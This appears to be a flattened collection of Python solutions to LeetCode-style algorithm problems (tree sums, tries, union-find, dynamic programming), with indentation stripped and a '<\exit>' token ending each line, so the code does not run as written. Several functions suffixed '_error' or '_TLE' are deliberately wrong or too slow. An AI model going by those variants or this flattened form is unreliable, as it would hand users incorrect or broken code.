def checkEqualTree(self, root: TreeNode) -> bool:<\exit>
self.dfs(root)<\exit>
total = self.sums.pop()<\exit>
return total % 2 == 0 and total // 2 in self.sums<\exit>
def dfs(self, node):<\exit>
if not node:<\exit>
return 0<\exit>
l = self.dfs(node.left)<\exit>
r = self.dfs(node.right)<\exit>
s = l + r + node.val<\exit>
self.sums.append(s)<\exit>
return s<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.exists = False<\exit>
self.root = None<\exit>
self.total_sum = None<\exit>
def checkEqualTree(self, root: TreeNode) -> bool:<\exit>
self.root = root<\exit>
self.total_sum = self.dfs(root)<\exit>
self.dfs(root)<\exit>
return self.exists<\exit>
def dfs(self, node):<\exit>
if not node:<\exit>
return 0<\exit>
l = self.dfs(node.left)<\exit>
r = self.dfs(node.right)<\exit>
s = l + r + node.val<\exit>
if node != self.root and self.total_sum != None and self.total_sum == s * 2:<\exit>
self.exists = True<\exit>
return s<\exit>
from typing import List<\exit>
class Solution:<\exit>
def checkPossibility(self, A: List[int]) -> bool:<\exit>
changed = False<\exit>
for i in range(len(A) - 1):<\exit>
if A[i] <= A[i + 1]:<\exit>
continue<\exit>
if not changed:<\exit>
if i - 1 < 0 or A[i-1] <= A[i+1]:<\exit>
A[i] = A[i+1]<\exit>
else:<\exit>
A[i+1] = A[i]<\exit>
changed = True<\exit>
else:<\exit>
return False<\exit>
return True<\exit>
def checkPossibility_error(self, A: List[int]) -> bool:<\exit>
changed = False<\exit>
for i in range(len(A) - 1):<\exit>
if A[i] <= A[i + 1]:<\exit>
continue<\exit>
if not changed:<\exit>
A[i] = A[i + 1]<\exit>
if i - 1 < 0 or A[i - 1] <= A[i]:<\exit>
changed = True<\exit>
else:<\exit>
return False<\exit>
else:<\exit>
return False<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
assert Solution().checkPossibility([4,2,3]) == True<\exit>
assert Solution().checkPossibility([3,4,2,3]) == False<\exit>
assert Solution().checkPossibility([2,3,3,2,4]) == True<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def trimBST(self, root: TreeNode, L: int, R: int) -> TreeNode:<\exit>
return self.walk(root, L, R)<\exit>
def walk(self, node, L, R):<\exit>
if not node:<\exit>
return None<\exit>
node.left = self.walk(node.left, L, R)<\exit>
node.right = self.walk(node.right, L, R)<\exit>
if node.val < L:<\exit>
return node.right<\exit>
elif node.val > R:<\exit>
return node.left<\exit>
else:<\exit>
return node<\exit>
class Solution:<\exit>
def maximumSwap(self, num: int) -> int:<\exit>
stk = []<\exit>
nums = list(str(num))<\exit>
n = len(nums)<\exit>
for i in range(n-1, -1, -1):<\exit>
if stk and stk[-1][1] >= nums[i]:<\exit>
continue<\exit>
stk.append((i, nums[i]))<\exit>
for i in range(n):<\exit>
while stk and stk[-1][0] <= i:<\exit>
stk.pop()<\exit>
if stk and stk[-1][1] > nums[i]:<\exit>
j = stk[-1][0]<\exit>
nums[i], nums[j] = nums[j], nums[i]<\exit>
break<\exit>
return int("".join(nums))<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maximumSwap(2736) == 7236<\exit>
assert Solution().maximumSwap(9973) == 9973<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def findSecondMinimumValue(self, root: TreeNode) -> int:<\exit>
ret = self.find(root)<\exit>
return -1 if ret == float('inf') else ret<\exit>
def find(self, root: TreeNode) -> int:<\exit>
if not root:<\exit>
return float('inf')<\exit>
if root.left and root.right:<\exit>
if root.left.val == root.val:<\exit>
left = self.find(root.left)<\exit>
else:<\exit>
left = root.left.val<\exit>
if root.right.val == root.val:<\exit>
right = self.find(root.right)<\exit>
else:<\exit>
right = root.right.val<\exit>
return min(left, right)<\exit>
return float('inf')<\exit>
from typing import List<\exit>
class LenCnt:<\exit>
def __init__(self, l, c):<\exit>
self.l = l<\exit>
self.c = c<\exit>
def __repr__(self):<\exit>
return repr((self.l, self.c))<\exit>
class Solution:<\exit>
def findNumberOfLIS(self, A: List[int]) -> int:<\exit>
if not A:<\exit>
return 0<\exit>
n = len(A)<\exit>
F = [LenCnt(l=1, c=1) for _ in A]<\exit>
mx = LenCnt(l=1, c=1)<\exit>
for i in range(1, n):<\exit>
for j in range(i):<\exit>
if A[i] > A[j]:<\exit>
if F[i].l < F[j].l + 1:<\exit>
F[i].l = F[j].l + 1<\exit>
F[i].c = F[j].c<\exit>
elif F[i].l == F[j].l + 1:<\exit>
F[i].c += F[j].c<\exit>
if F[i].l > mx.l:<\exit>
mx.l = F[i].l<\exit>
mx.c = F[i].c<\exit>
elif F[i].l == mx.l:<\exit>
mx.c += F[i].c<\exit>
return mx.c<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findNumberOfLIS([1,1,1,2,2,2,3,3,3]) == 27<\exit>
assert Solution().findNumberOfLIS([1, 3, 5, 4, 7]) == 2<\exit>
assert Solution().findNumberOfLIS([2, 2, 2, 2, 2]) == 5<\exit>
from typing import List<\exit>
class Solution:<\exit>
def findLengthOfLCIS(self, nums: List[int]) -> int:<\exit>
if not nums:<\exit>
return 0<\exit>
ret = 1<\exit>
i = 1<\exit>
while i < len(nums):<\exit>
cur = 1<\exit>
while i < len(nums) and nums[i] > nums[i-1]:<\exit>
cur += 1<\exit>
i += 1<\exit>
i += 1<\exit>
ret = max(ret, cur)<\exit>
return ret<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class MagicDictionary:<\exit>
def __init__(self):<\exit>
class Node:<\exit>
def __init__(self, chr):<\exit>
self.chr = chr<\exit>
self.end = False<\exit>
self.children = defaultdict(lambda: None)<\exit>
class Trie:<\exit>
def __init__(self):<\exit>
self.root = Node(None)<\exit>
def insert(self, cur, s, i):<\exit>
if not cur:<\exit>
cur = Node(s[i])<\exit>
if i == len(s) -1:<\exit>
cur.end = True<\exit>
else:<\exit>
nxt = s[i+1]<\exit>
cur.children[nxt] = self.insert(cur.children[nxt], s, i + 1)<\exit>
return cur<\exit>
def search(self, cur, s, i, modified):<\exit>
if cur.chr != s[i]:<\exit>
if modified:<\exit>
return False<\exit>
modified = True<\exit>
if i == len(s) - 1:<\exit>
return modified and cur.end<\exit>
for child in cur.children.values():<\exit>
if self.search(child, s, i + 1, modified):<\exit>
return True<\exit>
return False<\exit>
self.trie = Trie()<\exit>
def buildDict(self, dic: List[str]) -> None:<\exit>
for s in dic:<\exit>
root = self.trie.root<\exit>
root.children[s[0]] = self.trie.insert(root.children[s[0]], s, 0)<\exit>
def search(self, word: str) -> bool:<\exit>
for child in self.trie.root.children.values():<\exit>
if self.trie.search(child, word, 0, False):<\exit>
return True<\exit>
return False<\exit>
class MapSum:<\exit>
def __init__(self):<\exit>
from collections import defaultdict<\exit>
class TrieNode:<\exit>
def __init__(self, chr, sum, val):<\exit>
self.chr = chr<\exit>
self.sum = sum<\exit>
self.val = val<\exit>
self.children = defaultdict(lambda: None)<\exit>
class Trie:<\exit>
def __init__(self):<\exit>
self.root = TrieNode(None, 0, 0)<\exit>
def insert(self, cur, key, i, val):<\exit>
if not cur:<\exit>
cur = TrieNode(key[i], 0, 0)<\exit>
if i == len(key) - 1:<\exit>
delta = val - cur.val<\exit>
cur.val = val<\exit>
else:<\exit>
cur.children[key[i+1]], delta = self.insert(cur.children[key[i+1]], key, i + 1, val)<\exit>
cur.sum += delta<\exit>
return cur, delta<\exit>
self.trie = Trie()<\exit>
def insert(self, key: str, val: int) -> None:<\exit>
root = self.trie.root<\exit>
root.children[key[0]], _ = self.trie.insert(root.children[key[0]], key, 0, val)<\exit>
def sum(self, prefix: str) -> int:<\exit>
node = self.trie.root<\exit>
for a in prefix:<\exit>
if a not in node.children:<\exit>
return 0<\exit>
node = node.children[a]<\exit>
return node.sum<\exit>
class MapSum2:<\exit>
def __init__(self):<\exit>
class TrieNode:<\exit>
def __init__(self, chr, sum, val):<\exit>
self.chr = chr<\exit>
self.sum = sum<\exit>
self.val = val<\exit>
self.children = {}<\exit>
class Trie:<\exit>
def __init__(self):<\exit>
self.root = TrieNode(None, 0, 0)<\exit>
def insert(self, pi, key, i, val):<\exit>
if key[i] not in pi.children:<\exit>
cur = TrieNode(key[i], 0, 0)<\exit>
pi.children[key[i]] = cur<\exit>
cur = pi.children[key[i]]<\exit>
if i + 1 < len(key):<\exit>
cur.children[key[i+1]], delta = self.insert(cur, key, i + 1, val)<\exit>
else:<\exit>
delta = val - cur.val<\exit>
cur.val = val<\exit>
cur.sum += delta<\exit>
return cur, delta<\exit>
self.trie = Trie()<\exit>
def insert(self, key: str, val: int) -> None:<\exit>
self.trie.insert(self.trie.root, key, 0, val)<\exit>
def sum(self, prefix: str) -> int:<\exit>
node = self.trie.root<\exit>
for a in prefix:<\exit>
if a not in node.children:<\exit>
return 0<\exit>
node = node.children[a]<\exit>
return node.sum<\exit>
class Solution:<\exit>
def checkValidString(self, s: str) -> bool:<\exit>
stk_left = []<\exit>
stk_star = []<\exit>
for i, c in enumerate(s):<\exit>
if c == "(":<\exit>
stk_left.append(i)<\exit>
elif c == "*":<\exit>
stk_star.append(i)<\exit>
else:<\exit>
if stk_left:<\exit>
stk_left.pop()<\exit>
elif stk_star:<\exit>
stk_star.pop()<\exit>
else:<\exit>
return False<\exit>
while stk_left and stk_star and stk_star[-1] > stk_left[-1]:<\exit>
stk_star.pop()<\exit>
stk_left.pop()<\exit>
return not stk_left<\exit>
if __name__ == "__main__":<\exit>
assert Solution().checkValidString("(*))") == True<\exit>
assert Solution().checkValidString("*(") == False<\exit>
assert Solution().checkValidString("(*)") == True<\exit>
from typing import List<\exit>
class Solution:<\exit>
def judgePoint24(self, nums: List[int]) -> bool:<\exit>
return self.dfs(nums, {})<\exit>
def dfs(self, A, cache):<\exit>
if tuple(A) not in cache:<\exit>
n = len(A)<\exit>
if n == 1:<\exit>
return abs(A[0] - 24) < 0.001<\exit>
for i in range(n):<\exit>
for j in range(i):<\exit>
a = A[i]<\exit>
b = A[j]<\exit>
for c in (a+b, a-b, b-a, a*b, b and a/b, a and b/a):<\exit>
A_new = A[:j] + A[j+1:i] + A[i+1:] + [c]<\exit>
A_new.sort()<\exit>
if self.dfs(A_new, cache):<\exit>
cache[tuple(A)] = True<\exit>
return cache[tuple(A)]<\exit>
cache[tuple(A)] = False<\exit>
return cache[tuple(A)]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().judgePoint24([4, 1, 8, 7]) == True<\exit>
assert Solution().judgePoint24([1, 2, 1, 2]) == False<\exit>
class Solution:<\exit>
def validPalindrome(self, s: str) -> bool:<\exit>
n = len(s)<\exit>
i = 0<\exit>
j = n - 1<\exit>
while i < j:<\exit>
if s[i] == s[j]:<\exit>
i += 1<\exit>
j -= 1<\exit>
else:<\exit>
return self.is_palindrome(s[i:j]) or self.is_palindrome(s[i+1:j+1])<\exit>
return True<\exit>
def is_palindrome(self, s):<\exit>
return s == s[::-1]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().validPalindrome("aba") == True<\exit>
assert Solution().validPalindrome("abca") == True<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class DisjointSet():<\exit>
def __init__(self):<\exit>
self.sz = {}<\exit>
self.pi = {}<\exit>
def add(self, x):<\exit>
if x not in self.pi:<\exit>
self.sz[x] = 1<\exit>
self.pi[x] = x<\exit>
def unionize(self, x, y):<\exit>
p1 = self.root(x)<\exit>
p2 = self.root(y)<\exit>
if p1 != p2:<\exit>
sz1 = self.sz[p1]<\exit>
sz2 = self.sz[p2]<\exit>
if sz1 > sz2:<\exit>
p1, p2 = p2, p1<\exit>
self.pi[p1] = p2<\exit>
self.sz[p2] += self.sz[p1]<\exit>
del self.sz[p1]<\exit>
def root(self, x):<\exit>
p = self.pi[x]<\exit>
if p != x:<\exit>
self.pi[x] = self.root(p)<\exit>
return self.pi[x]<\exit>
def is_union(self, x, y):<\exit>
if x in self.pi and y in self.pi:<\exit>
return self.root(x) == self.root(y)<\exit>
return False<\exit>
class Solution:<\exit>
def findRedundantConnection(self, edges: List[List[int]]) -> List[int]:<\exit>
ds = DisjointSet()<\exit>
for p, q in edges:<\exit>
ds.add(p)<\exit>
ds.add(q)<\exit>
if ds.is_union(p, q):<\exit>
return [p, q]<\exit>
ds.unionize(p, q)<\exit>
raise<\exit>
class Solution_dfs:<\exit>
def findRedundantConnection(self, edges: List[List[int]]) -> List[int]:<\exit>
G = defaultdict(set)<\exit>
for p, q in edges:<\exit>
G[p].add(q)<\exit>
G[q].add(p)<\exit>
visited = set()<\exit>
for k in G.keys():<\exit>
if k not in visited:<\exit>
circle = self.dfs(G, k, None, set([k]), [k], visited)<\exit>
if circle:<\exit>
for p, q in reversed(edges):<\exit>
if p in circle and q in circle:<\exit>
return [p, q]<\exit>
raise<\exit>
def dfs(self, G, cur, pi, path, path_list, visited):<\exit>
visited.add(cur)<\exit>
for nbr in G[cur]:<\exit>
if nbr != pi:<\exit>
if nbr in path:<\exit>
circle = set()<\exit>
in_circle = False<\exit>
for e in path_list:<\exit>
if e == nbr:<\exit>
in_circle = True<\exit>
if in_circle:<\exit>
circle.add(e)<\exit>
return circle<\exit>
path.add(nbr)<\exit>
path_list.append(nbr)<\exit>
circle = self.dfs(G, nbr, cur, path, path_list, visited)<\exit>
if circle:<\exit>
return circle<\exit>
path.remove(nbr)<\exit>
path_list.pop()<\exit>
return None<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findRedundantConnection([[1,2], [1,3], [2,3]]) == [2, 3]<\exit>
assert Solution().findRedundantConnection([[1,2], [2,3], [3,4], [1,4], [1,5]]) == [1, 4]<\exit>
assert Solution().findRedundantConnection([[30,44],[34,47],[22,32],[35,44],[26,36],[2,15],[38,41],[28,35],[24,37],[14,49],[44,45],[11,50],[20,39],[7,39],[19,22],[3,17],[15,25],[1,39],[26,40],[5,14],[6,23],[5,6],[31,48],[13,22],[41,44],[10,19],[12,41],[1,12],[3,14],[40,50],[19,37],[16,26],[7,25],[22,33],[21,27],[9,50],[24,42],[43,46],[21,47],[29,40],[31,34],[9,31],[14,31],[5,48],[3,18],[4,19],[8,17],[38,46],[35,37],[17,43]]) == [5,48]<\exit>
import math<\exit>
class Solution:<\exit>
def repeatedStringMatch(self, A, B):<\exit>
r = math.ceil(len(B) / len(A))<\exit>
for count in (r, r + 1):<\exit>
if B in A * count:<\exit>
return count<\exit>
return -1<\exit>
def repeatedStringMatch_TLE(self, A: str, B: str) -> int:<\exit>
for i in range(len(A)):<\exit>
j = 0<\exit>
count = 0<\exit>
while j < len(B):<\exit>
if i + j - count * len(A) >= len(A):<\exit>
count += 1<\exit>
idx = i + j - count * len(A)<\exit>
if A[idx] == B[j]:<\exit>
j += 1<\exit>
else:<\exit>
break<\exit>
if j == len(B):<\exit>
return count + 1<\exit>
return -1<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.ret = 0<\exit>
def longestUnivaluePath(self, root: TreeNode) -> int:<\exit>
self.find(root)<\exit>
return self.ret<\exit>
def find(self, node):<\exit>
if not node:<\exit>
return 0<\exit>
left = self.find(node.left)<\exit>
right = self.find(node.right)<\exit>
left_path = left + 1 if node.left and node.left.val == node.val else 0<\exit>
right_path = right + 1 if node.right and node.right.val == node.val else 0<\exit>
self.ret = max(self.ret, left_path + right_path)<\exit>
return max(left_path, right_path)<\exit>
class Solution_error:<\exit>
def __init__(self):<\exit>
self.ret = 0<\exit>
def longestUnivaluePath(self, root: TreeNode) -> int:<\exit>
self.find(root)<\exit>
return self.ret<\exit>
def find(self, node):<\exit>
if not node:<\exit>
return 0<\exit>
left = self.find(node.left)<\exit>
right = self.find(node.right)<\exit>
cur = 1<\exit>
path = 1<\exit>
if left and node.left.val == node.val:<\exit>
path += left<\exit>
cur = left + 1<\exit>
if right and node.right.val == node.val:<\exit>
path += right<\exit>
if right > left:<\exit>
cur = right + 1<\exit>
self.ret = max(self.ret, path - 1)<\exit>
return cur<\exit>
dirs = (<\exit>
(-1, -2),<\exit>
(-1, 2),<\exit>
(1, -2),<\exit>
(1, 2),<\exit>
(-2, -1),<\exit>
(-2, 1),<\exit>
(2, -1),<\exit>
(2, 1),<\exit>
)<\exit>
class Solution:<\exit>
def knightProbability(self, N: int, K: int, r: int, c: int) -> float:<\exit>
q = set([(r, c)])<\exit>
P = [[0 for _ in range(N)] for _ in range(N)]<\exit>
P[r][c] = 1<\exit>
k = 0<\exit>
while k < K:<\exit>
k += 1<\exit>
cur_q = set()<\exit>
cur_P = [[0 for _ in range(N)] for _ in range(N)]<\exit>
for i, j in q:<\exit>
for di, dj in dirs:<\exit>
I = i + di<\exit>
J = j + dj<\exit>
if 0 <= I < N and 0 <= J < N:<\exit>
cur_q.add((I, J))<\exit>
cur_P[I][J] += P[i][j] * 1 / 8<\exit>
q = cur_q<\exit>
P = cur_P<\exit>
return sum([<\exit>
P[i][j]<\exit>
for i in range(N)<\exit>
for j in range(N)<\exit>
])<\exit>
def knightProbability_error(self, N: int, K: int, r: int, c: int) -> float:<\exit>
q = [(r, c)]<\exit>
P = [[0 for _ in range(N)] for _ in range(N)]<\exit>
P[r][c] = 1<\exit>
k = 0<\exit>
while k < K:<\exit>
k += 1<\exit>
cur_q = []<\exit>
cur_P = [[0 for _ in range(N)] for _ in range(N)]<\exit>
for i, j in q:<\exit>
for di, dj in dirs:<\exit>
I = i + di<\exit>
J = j + dj<\exit>
if 0 <= I < N and 0 <= J < N:<\exit>
cur_q.append((I, J))<\exit>
cur_P[I][J] += P[i][j] * 1 / 8<\exit>
q = cur_q<\exit>
P = cur_P<\exit>
return sum([<\exit>
P[i][j]<\exit>
for i in range(N)<\exit>
for j in range(N)<\exit>
])<\exit>
if __name__ == "__main__":<\exit>
assert Solution().knightProbability(3, 2, 0, 0)  == 0.0625<\exit>
assert Solution().knightProbability(3, 3, 0, 0)  == 0.015625<\exit>
import heapq<\exit>
from collections import defaultdict<\exit>
from typing import List<\exit>
class Word:<\exit>
def __init__(self, content, count):<\exit>
self.content = content<\exit>
self.count = count<\exit>
def __lt__(self, other):<\exit>
if self.count == other.count:<\exit>
return self.content > other.content<\exit>
return self.count < other.count<\exit>
class Solution:<\exit>
def topKFrequent(self, words: List[str], k: int) -> List[str]:<\exit>
h = []<\exit>
counter = defaultdict(int)<\exit>
for w in words:<\exit>
counter[w] += 1<\exit>
for w, c in counter.items():<\exit>
heapq.heappush(h, Word(w, c))<\exit>
if len(h) > k:<\exit>
heapq.heappop(h)<\exit>
ret = []<\exit>
while h:<\exit>
w = heapq.heappop(h).content<\exit>
ret.append(w)<\exit>
return ret[::-1]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().topKFrequent(["i", "love", "leetcode", "i", "love", "coding"], 2)<\exit>
class Solution:<\exit>
def hasAlternatingBits(self, n: int) -> bool:<\exit>
last = None<\exit>
while n:<\exit>
cur = n & 1<\exit>
if last is not None and last ^ cur == 0:<\exit>
return False<\exit>
last = cur<\exit>
n >>= 1<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
assert Solution().hasAlternatingBits(5) == True<\exit>
assert Solution().hasAlternatingBits(7) == False<\exit>
from typing import List<\exit>
dirs = ((0, -1), (0, 1), (-1, 0), (1, 0))<\exit>
class Solution:<\exit>
def maxAreaOfIsland(self, grid: List[List[int]]) -> int:<\exit>
if not grid:<\exit>
return 0<\exit>
ret = 0<\exit>
m, n = len(grid), len(grid[0])<\exit>
visited = [[False for _ in range(n)] for _ in range(m)]<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
if not visited[i][j] and grid[i][j] == 1:<\exit>
ret = max(ret, self.dfs(grid, i, j, visited))<\exit>
return ret<\exit>
def dfs(self, grid, i, j, visited) -> int:<\exit>
visited[i][j] = True<\exit>
ret = 1<\exit>
m, n = len(grid), len(grid[0])<\exit>
for di, dj in dirs:<\exit>
I = i + di<\exit>
J = j + dj<\exit>
if 0 <= I < m and 0 <= J < n and not visited[I][J] and grid[I][J] == 1:<\exit>
ret += self.dfs(grid, I, J, visited)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
grid = [[0,0,1,0,0,0,0,1,0,0,0,0,0],<\exit>
[0,0,0,0,0,0,0,1,1,1,0,0,0],<\exit>
[0,1,1,0,1,0,0,0,0,0,0,0,0],<\exit>
[0,1,0,0,1,1,0,0,1,0,1,0,0],<\exit>
[0,1,0,0,1,1,0,0,1,1,1,0,0],<\exit>
[0,0,0,0,0,0,0,0,0,0,1,0,0],<\exit>
[0,0,0,0,0,0,0,1,1,1,0,0,0],<\exit>
[0,0,0,0,0,0,0,1,1,0,0,0,0]]<\exit>
assert Solution().maxAreaOfIsland(grid) == 6<\exit>
class Solution:<\exit>
def countBinarySubstrings(self, s: str) -> int:<\exit>
cur = 1<\exit>
prev = 0<\exit>
ret = 0<\exit>
for i in range(1, len(s)):<\exit>
if s[i] == s[i-1]:<\exit>
cur += 1<\exit>
else:<\exit>
prev = cur<\exit>
cur = 1<\exit>
if prev >= cur:<\exit>
ret += 1<\exit>
return ret<\exit>
def countBinarySubstrings_error(self, s: str) -> int:<\exit>
counter = {"0": 0, "1": 0}<\exit>
ret = 0<\exit>
if not s:<\exit>
return ret<\exit>
counter[s[0]] += 1<\exit>
for i in range(1, len(s)):<\exit>
if s[i] != s[i-1] and counter[s[i]] != 0:<\exit>
counter[s[i]] = 0<\exit>
counter[s[i]] += 1<\exit>
if min(counter["0"], counter["1"]) > 0:<\exit>
ret += 1<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().countBinarySubstrings("00110011") == 6<\exit>
assert Solution().countBinarySubstrings("00110") == 3<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def findShortestSubArray(self, nums: List[int]) -> int:<\exit>
if not nums:<\exit>
return<\exit>
counter = defaultdict(int)<\exit>
first = {}<\exit>
mx = [0, 0]<\exit>
for i, n in enumerate(nums):<\exit>
if n not in first:<\exit>
first[n] = i<\exit>
counter[n] += 1<\exit>
if counter[n] > mx[0]:<\exit>
mx = [counter[n], i - first[n] + 1]<\exit>
elif counter[n] == mx[0]:<\exit>
mx[1] = min(mx[1], i - first[n] + 1)<\exit>
return mx[1]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findShortestSubArray([1, 2, 2, 3, 1]) == 2<\exit>
from typing import List<\exit>
class Solution:<\exit>
def canPartitionKSubsets(self, nums: List[int], k: int) -> bool:<\exit>
s = sum(nums)<\exit>
if s % k != 0:<\exit>
return False<\exit>
target = s // k<\exit>
visited = [False for _ in nums]<\exit>
return self.dfs(nums, 0, None, target, visited, k)<\exit>
def dfs(self, nums, start_idx, cur_sum, target_sum, visited, k):<\exit>
if k == 1:<\exit>
return True<\exit>
if cur_sum and cur_sum == target_sum:<\exit>
return self.dfs(nums, 0, None, target_sum, visited, k - 1)<\exit>
for i in range(start_idx, len(nums)):<\exit>
if not visited[i]:<\exit>
visited[i] = True<\exit>
nxt_sum = (cur_sum or 0) + nums[i]<\exit>
if self.dfs(nums, i + 1, nxt_sum, target_sum, visited, k):<\exit>
return True<\exit>
visited[i] = False<\exit>
return False<\exit>
class Solution_TLE:<\exit>
def canPartitionKSubsets(self, nums: List[int], k: int) -> bool:<\exit>
s = sum(nums)<\exit>
if s % k != 0:<\exit>
return False<\exit>
target = s // k<\exit>
visited = [False for _ in nums]<\exit>
return self.dfs(nums, None, target, visited, k)<\exit>
def dfs(self, nums, cur_sum, target_sum, visited, k):<\exit>
if k == 0:<\exit>
return True<\exit>
if cur_sum and cur_sum == target_sum:<\exit>
return self.dfs(nums, None, target_sum, visited, k - 1)<\exit>
for i in range(len(nums)):<\exit>
if not visited[i]:<\exit>
visited[i] = True<\exit>
nxt_sum = (cur_sum or 0) + nums[i]<\exit>
if self.dfs(nums, nxt_sum, target_sum, visited, k):<\exit>
return True<\exit>
visited[i] = False<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().canPartitionKSubsets([5, 3, 2, 3, 1, 2, 4], 4) == True<\exit>
assert Solution().canPartitionKSubsets([4, 3, 2, 3, 5, 2, 1], 4) == True<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def searchBST(self, root: TreeNode, val: int) -> TreeNode:<\exit>
if not root:<\exit>
return None<\exit>
if root.val == val:<\exit>
return root<\exit>
elif root.val < val:<\exit>
return self.searchBST(root.right, val)<\exit>
else:<\exit>
return self.searchBST(root.left, val)<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def insertIntoBST(self, root: TreeNode, val: int) -> TreeNode:<\exit>
if not root:<\exit>
return TreeNode(val)<\exit>
if root.val < val:<\exit>
root.right = self.insertIntoBST(root.right, val)<\exit>
elif root.val > val:<\exit>
root.left = self.insertIntoBST(root.left, val)<\exit>
else:<\exit>
raise<\exit>
return root<\exit>
from typing import List<\exit>
import heapq<\exit>
class KthLargest:<\exit>
def __init__(self, k: int, nums: List[int]):<\exit>
self.h = []<\exit>
self.k = k<\exit>
for n in nums:<\exit>
self.add(n)<\exit>
def add(self, val: int) -> int:<\exit>
heapq.heappush(self.h, val)<\exit>
if len(self.h) > self.k:<\exit>
heapq.heappop(self.h)<\exit>
return self.h[0]<\exit>
from typing import List<\exit>
class Solution:<\exit>
def search(self, nums: List[int], target: int) -> int:<\exit>
lo = 0<\exit>
hi = len(nums)<\exit>
while lo < hi:<\exit>
mid = (lo + hi) // 2<\exit>
if nums[mid] == target:<\exit>
return mid<\exit>
elif nums[mid] < target:<\exit>
lo = mid + 1<\exit>
else:<\exit>
hi = mid<\exit>
return -1<\exit>
class Solution:<\exit>
def minimumDeleteSum(self, s1: str, s2: str) -> int:<\exit>
m, n = len(s1), len(s2)<\exit>
F = [[float('inf') for _ in range(n + 1)] for _ in range(m + 1)]<\exit>
F[0][0] = 0<\exit>
for i in range(1, m + 1):<\exit>
F[i][0] = F[i-1][0] + ord(s1[i-1])<\exit>
for j in range(1, n + 1):<\exit>
F[0][j] = F[0][j-1] + ord(s2[j-1])<\exit>
for i in range(1, m + 1):<\exit>
for j in range(1, n + 1):<\exit>
F[i][j] = min(<\exit>
F[i][j],<\exit>
F[i][j-1] + ord(s2[j-1]),<\exit>
F[i-1][j] + ord(s1[i-1]),<\exit>
)<\exit>
if s1[i-1] == s2[j-1]:<\exit>
F[i][j] = min(<\exit>
F[i][j],<\exit>
F[i-1][j-1],<\exit>
)<\exit>
return F[m][n]<\exit>
def minimumDeleteSum_error(self, s1: str, s2: str) -> int:<\exit>
m, n = len(s1), len(s2)<\exit>
F = [[float('inf') for _ in range(n + 1)] for _ in range(m + 1)]<\exit>
F[0][0] = 0<\exit>
F[1][0] = ord(s1[0])<\exit>
F[0][1] = ord(s2[0])<\exit>
for i in range(1, m + 1):<\exit>
for j in range(1, n + 1):<\exit>
F[i][j] = min(<\exit>
F[i][j],<\exit>
F[i][j-1] + ord(s2[j-1]),<\exit>
F[i-1][j] + ord(s1[i-1]),<\exit>
)<\exit>
if s1[i-1] == s2[j-1]:<\exit>
F[i][j] = min(<\exit>
F[i][j],<\exit>
F[i-1][j-1],<\exit>
)<\exit>
return F[m][n]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minimumDeleteSum("sea", "eat") == 231<\exit>
assert Solution().minimumDeleteSum("delete", "leet") == 403<\exit>
from typing import List<\exit>
class Solution:<\exit>
def numSubarrayProductLessThanK(self, nums: List[int], k: int) -> int:<\exit>
i = 0<\exit>
ret = 0<\exit>
p = 1<\exit>
for j in range(len(nums)):<\exit>
p *= nums[j]<\exit>
while p >= k and i <= j:<\exit>
p //= nums[i]<\exit>
i += 1<\exit>
ret += j - i + 1<\exit>
return ret<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def findLength(self, A: List[int], B: List[int]) -> int:<\exit>
m, n = len(A), len(B)<\exit>
F = defaultdict(lambda: defaultdict(int))<\exit>
for i in range(1, m+1):<\exit>
for j in range(1, n+1):<\exit>
if A[i-1] == B[j-1]:<\exit>
F[i][j] = F[i-1][j-1] + 1<\exit>
return max(<\exit>
F[i][j]<\exit>
for i in range(1, m+1)<\exit>
for j in range(1, n+1)<\exit>
)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findLength([1,2,3,2,1], [3,2,1,4,7]) == 3<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def accountsMerge(self, accounts: List[List[str]]) -> List[List[str]]:<\exit>
email_to_ids = defaultdict(set)<\exit>
for i, v in enumerate(accounts):<\exit>
for email in v[1:]:<\exit>
email_to_ids[email].add(i)<\exit>
visited = [False for _ in accounts]<\exit>
ret = []<\exit>
for i, v in enumerate(accounts):<\exit>
if not visited[i]:<\exit>
emails = set()<\exit>
self.dfs(i, accounts, email_to_ids, emails, visited)<\exit>
ret.append([v[0]] + sorted(emails))<\exit>
return ret<\exit>
def dfs(self, i, accounts, email_to_ids, emails, visited):<\exit>
visited[i] = True<\exit>
for email in accounts[i][1:]:<\exit>
emails.add(email)<\exit>
for nbr in email_to_ids[email]:<\exit>
if not visited[nbr]:<\exit>
self.dfs(nbr, accounts, email_to_ids, emails, visited)<\exit>
def accountsMerge_error(self, accounts: List[List[str]]) -> List[List[str]]:<\exit>
email_id = {}<\exit>
id_emails = defaultdict(list)<\exit>
for i in range(len(accounts)):<\exit>
person = None<\exit>
for email in accounts[i][1:]:<\exit>
